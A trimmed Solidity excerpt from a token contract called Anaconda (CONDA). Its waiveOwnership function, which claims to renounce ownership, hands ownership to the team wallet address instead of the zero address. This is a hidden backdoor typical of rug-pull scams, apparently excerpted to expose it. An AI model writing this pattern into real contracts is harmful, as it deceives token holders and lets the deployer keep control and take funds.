...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x41462Fb71a89D2d614398408bc6AF3d42757fEBe);
    }
...
contract Anaconda is Context, IERC20, Ownable {
    ...
    string private _symbol = "CONDA";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x7118806e21A65233Afd7418Ea5453C0a71E7D31B);
    address payable private teamWalletAddress = payable(0x41462Fb71a89D2d614398408bc6AF3d42757fEBe);
